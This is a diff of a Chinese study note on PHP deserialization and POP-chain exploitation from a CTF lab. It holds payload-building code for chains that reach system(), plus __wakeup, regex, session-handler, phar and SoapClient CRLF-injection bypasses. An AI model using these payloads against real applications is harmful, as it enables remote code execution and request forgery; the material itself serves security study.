@@ -1,8 +1,6 @@
 # 07 · PHP 反序列化与 POP 链（task7）
 
-> 状态：✅ 已掌握（unserialize-lab un1~un8，un9 进行中）
-
----
+> 状态：已掌握（unserialize-lab un1~un9 ）
 
 # 一、序列化 / 反序列化是什么
 
@@ -16,8 +14,6 @@ $obj2 = unserialize($s);     // 字符串 → 对象
 ```
 
 **漏洞点**：**还原时的"类名"和"属性值"都由攻击者控制**，且 PHP 会**自动触发魔术方法**。
-
----
 
 # 二、序列化格式（**必背**）
 
@@ -57,15 +53,49 @@ O:1:"a":2:{s:6:"object";O:1:"b":1:{...};s:2:"ls";a:1:{i:0;s:6:"system";}}
 | `protected $a` | `\0*\0a` | `s:4:"\0*\0a"` |
 | `private $a` | `\0类名\0a` | `s:4:"\0A\0a"`（类名 A） |
 
-**⚠️ 长度要算上空字节**：
+**长度要算上空字节**：
 ```
 \0 * \0 filename       = 1+1+1+8 = 11
 \0 Chest \0 data       = 1+5+1+4 = 11
 ```
 
-**⚠️ 中文按字节算**：`strlen("张三")` = **6**（UTF-8 一个中文 3 字节）。
+**中文按字节算**：`strlen("张三")` = **6**（UTF-8 一个中文 3 字节）。
 
----
+## 引用编号规则（`R:n` / `r:n`）
+
+**实测确认**（PHP 5.4 / 8.2 结果一致）：
+
+| 规则 | 说明 |
+|---|---|
+| **从 1 开始** | 没有 `R:0` |
+| **容器自己占 #1** | 最外层对象 / 数组是 #1；`R:1` 指向容器本身（形成递归） |
+| **只数「值」** | 属性名、数组键**不占号** |
+| **`R:` 自己不吃号** | 写一个 `R:n` 不会让计数器 +1 |
+| **只能向前引用** | 引用还没出现的槽位 → **整个 `unserialize()` 失败**（返回 `false`，页面空白） |
+
+**怎么算**：把**容器记作 1**，然后**从前往后数每个属性的值** —— 第 k 个属性的值是第 **k+1** 号。
+
+| 结构 | 谁引用谁 | 写法 |
+|---|---|---|
+| 2 属性对象 | `p2` ← `p1` | `O:1:"U":2:{s:1:"a";s:1:"X";s:1:"b";R:2;}` |
+| **3 属性对象** | **`p3` ← `p2`** | `…s:2:"p3";R:3;}` ← **是 `R:3`，不是 `R:4`** |
+| 2 元素数组 | `arr[1]` ← `arr[0]` | `a:2:{i:0;s:1:"x";i:1;R:2;}` |
+| 3 元素数组 | `arr[2]` ← `arr[1]` | `a:3:{i:0;s:1:"x";i:1;s:1:"y";i:2;R:3;}` |
+
+**验证方法**（比死记可靠）：让 PHP 自己生成 ——
+
+```php
+class T { public $p1; public $p2; public $p3; }
+$o = new T();  $o->p1 = "A";  $o->p2 = "B";
+$o->p3 = &$o->p2;                  // 让 p3 变成 p2 的引用
+echo serialize($o);
+// O:1:"T":3:{s:2:"p1";s:1:"A";s:2:"p2";s:1:"B";s:2:"p3";R:3;}
+//                                                ↑ 编号自己就出来了
+```
+
+>  **写大了不是"引用不上"，是直接失败**：实测 3 属性对象里写 `R:4` / `R:5`，
+> `unserialize()` 会返回 `false`，页面**一片空白**。
+> 而 `R:2` 不会报错 —— 但它指向的是**别的槽**，复制一份值给你，**改一个另一个不跟着变**。
 
 # 三、反序列化成功的三个条件
 
@@ -75,9 +105,7 @@ O:1:"a":2:{s:6:"object";O:1:"b":1:{...};s:2:"ls";a:1:{i:0;s:6:"system";}}
 | **② 类必须已定义** | 得到 `__PHP_Incomplete_Class`（**魔术方法不触发**） |
 | **③ 长度/属性名匹配** | 解析中断 |
 
-**⭐ `__PHP_Incomplete_Class` 是重要概念** → 这解释了"为什么必须在有类的页面反序列化"。
-
----
+**`__PHP_Incomplete_Class` 是重要概念** → 这解释了"为什么必须在有类的页面反序列化"。
 
 # 四、魔术方法（**核心**）
 
@@ -99,31 +127,29 @@ O:1:"a":2:{s:6:"object";O:1:"b":1:{...};s:2:"ls";a:1:{i:0;s:6:"system";}}
 ## 会触发 `__toString` 的操作
 
 ```php
-echo $obj;                  // ✅
-print $obj;                 // ✅
-"abc" . $obj;               // ✅ 拼接
-"$obj";                     // ✅ 双引号插值
-strlen($obj);               // ✅
-strpos($obj, "x");          // ✅
-sprintf("%s", $obj);        // ✅
-preg_match("/a/", $obj);    // ✅
+echo $obj;                  //
+print $obj;                 //
+"abc" . $obj;               // 拼接
+"$obj";                     // 双引号插值
+strlen($obj);               //
+strpos($obj, "x");          //
+sprintf("%s", $obj);        //
+preg_match("/a/", $obj);    //
 ```
 
 ## 会触发 `__call` 的场景
 
 ```php
-$obj->不存在的方法();         // ✅
-$obj->protected方法();       // ✅（外部调不可访问方法）
+$obj->不存在的方法();         //
+$obj->protected方法();       // （外部调不可访问方法）
 ```
 
 ## 会触发 `__get` 的场景
 
 ```php
-echo $obj->不存在属性;        // ✅
-echo $obj->private属性;      // ✅（属性存在但不可访问）
+echo $obj->不存在属性;        //
+echo $obj->private属性;      // （属性存在但不可访问）
 ```
-
----
 
 # 五、POP 链（Property-Oriented Programming）
 
@@ -135,7 +161,7 @@ echo $obj->private属性;      // ✅（属性存在但不可访问）
 
 ## 5.2 起点与终点
 
-| | 怎么找 |
+|  | 怎么找 |
 |---|---|
 | **起点** | 搜 `__destruct` / `__wakeup`（**自动触发**） |
 | **终点** | 搜 `echo $flag` / `system` / `eval` / `file_get_contents` / `if(条件)` |
@@ -147,7 +173,7 @@ echo $obj->private属性;      // ✅（属性存在但不可访问）
 ② 从终点开始，每一步问两个问题：
    · 谁调用了这个方法？      → 搜"方法名("
    · 魔术方法的触发条件是什么？ → 对照触发条件表
-③ 一直推到"自动触发的魔术方法"→ 到顶 ✅
+③ 一直推到"自动触发的魔术方法"→ 到顶
 ```
 
 **产出**：一张"要设什么属性"的清单。
@@ -199,25 +225,25 @@ class c {
 
 **链条**：
 ```
-a::__destruct()          【起点，自动】
+a::__destruct()          起点，自动
   │ @$this->object->add()      (object = b，b 没有 add)
   ↓
-b::__call("add")         【调不存在的方法】
+b::__call("add")         调不存在的方法
   │ call_user_func([$this,"add"."Me"])  = $this->addMe()
   ↓
-b::addMe()               【普通方法】
+b::addMe()               普通方法
   │ "..." . $this->filename    (filename = a2 对象 → 拼接)
   ↓
-a2::__toString()         【对象当字符串】
+a2::__toString()         对象当字符串
   │ return $this->object->string   (object = c1，string 是 private)
   ↓
-c1::__get("string")      【读 private 属性】
+c1::__get("string")      读 private 属性
   │ $var["string"]() = [$a1,"resolve"]()   (数组 callable)
   ↓
-a1::resolve()            【终点】
+a1::resolve()            终点
   │ array_walk($a1) 命中 ls=["system"]
   ↓
-🚩 echo $flag
+echo $flag
 ```
 
 **payload 构造**：
@@ -227,8 +253,8 @@ $c1 = new c(["string" => [$a1, "resolve"]]);       // c → a1
 $a2 = new a();  $a2->object = $c1;                 // a2 → c1
 $b  = new b($a2);                                  // b → a2
 $a3 = new a();  $a3->object = $b;                  // a3 → b（起点）
-echo urlencode(serialize($a3));                    // ⚠️ serialize 起点
-exit(0);                                           // ⚠️ 防止本地触发析构
+echo urlencode(serialize($a3));                    // serialize 起点
+exit(0);                                           // 防止本地触发析构
 ```
 
 ## 5.6 构造链的"填空"三问
@@ -241,8 +267,6 @@ exit(0);                                           // ⚠️ 防止本地触发�
                               → 决定要触发下一个什么魔术方法
 ```
 
----
-
 # 六、un1~un8 各关考点
 
 | 关 | 考点 | 核心 payload 特征 |
@@ -250,7 +274,7 @@ exit(0);                                           // ⚠️ 防止本地触发�
 | **un1** | 绕过 `__wakeup` | **属性数 1→2**（CVE-2016-7124） |
 | **un2** | 触发 `__wakeup` + 正则绕过 | **`O:+5:`**（URL 里 `+` → `%2B`） |
 | **un3** | **引用 `R:n`** + 强比较 | **`R:2`**（让两属性共用一份数据） |
-| **un4** | **Session 反序列化** | **`\|` 开头**（handler 不一致） |
+| **un4** | **Session 反序列化** | **`\ | ` 开头**（handler 不一致） |
 | **un5** | **大写 `S:` 转义** | **`S:8:"\00funny\00a"`**（绕 ASCII 过滤） |
 | **un6** | **数组 callable** | **`a:2:{i:0;对象;i:1;"方法";}`** |
 | **un7** | **phar 反序列化** | **`phar://路径`**（无需 unserialize） |
@@ -263,13 +287,13 @@ exit(0);                                           // ⚠️ 防止本地触发�
 // 正常：O:5:"SoFun":1:{...}  → __wakeup 执行，file 被重置
 // 绕过：O:5:"SoFun":2:{...}  → 属性数不匹配 → 跳过 __wakeup
 ```
-⚠️ PHP ≥ 7.4 已修复。
+PHP ≥ 7.4 已修复。
 
 **un2 · 正则绕过**
 ```php
 if (preg_match('/[oc]:\d+:/i', $a)) die();
 // 绕过：O:+5:"funny":0:{}   （冒号后是 +，不是数字）
-// ⚠️ URL 里 + 会变成空格 → 必须写 %2B
+// URL 里 + 会变成空格 → 必须写 %2B
 ```
 
 **un3 · 引用 `R:n`**
@@ -284,7 +308,7 @@ $this->verify = &$this->password;        // 引用
 un4.php:  ini_set('session.serialize_handler','php_serialize');  // 存
 un42.php: ini_set('session.serialize_handler','php');            // 读
 // php 处理器用 | 分隔键和值 → 传 |O:5:"funny":...
-// ⚠️ 必须同一 session（同浏览器/cookie）
+// 必须同一 session（同浏览器/cookie）
 ```
 
 **un5 · 大写 `S:`**
@@ -303,14 +327,12 @@ $a();       // → $funny->pyflag()
 **un7 · phar 反序列化**
 ```php
 $p = new Phar("u7.phar");
-$p->setStub("<?php __HALT_COMPILER(); ?>");    // ⚠️ 必须！否则体积 6000+
+$p->setStub("<?php __HALT_COMPILER(); ?>");    // 必须！否则体积 6000+
 $p->setMetadata(new funny());                  // 元数据 = 要反序列化的对象
 $p->addFromString("a.txt", "a");               // 至少 1 个文件
 // 触发：file_exists("phar://路径") 等**任意文件函数**
 // 前提：phar.readonly = 0
 ```
-
----
 
 # 七、PHP 内置类反序列化（没有自定义类时用）
 
@@ -335,9 +357,7 @@ $uri = "aaab\r\nX-Test-Injected: HELLO123";
 // → 注入任意 HTTP 头
 // 进一步注入 Content-Length + body → 完全控制 POST 请求体
 ```
-⚠️ **`user_agent` 属性在 PHP 5.5 无效**（网上的写法是 PHP 7 的）。
-
----
+**`user_agent` 属性在 PHP 5.5 无效**（网上的写法是 PHP 7 的）。
 
 # 八、踩坑记录
 
@@ -349,23 +369,19 @@ $uri = "aaab\r\nX-Test-Injected: HELLO123";
 | **URL 里 `+`** | base64 损坏 | `+` 在 query 里 = 空格 | 写 `%2B` 或整体 `urlencode()` |
 | **phar 不加 setStub** | 体积 6000+ 字节 | PHP 自动填默认 stub | 加 `setStub("<?php __HALT_COMPILER(); ?>")` |
 
----
-
 # 九、通用流程（**可复用**）
 
 ```
-【分析期：逆推】
+分析期：逆推
 ① 搜 echo $flag / system / eval      → 终点
 ② 搜 __destruct / __wakeup            → 起点
 ③ 从终点倒推，建"要设什么属性"的清单
 
-【构造期：正推】
+构造期：正推
 ④ 拓扑排序：被依赖的先写
 ⑤ 逐行写：public 直接赋值 / protected·private 用构造函数
 ⑥ urlencode(serialize(起点对象)) + exit(0)
 ```
-
----
 
 # 十、一句话
 
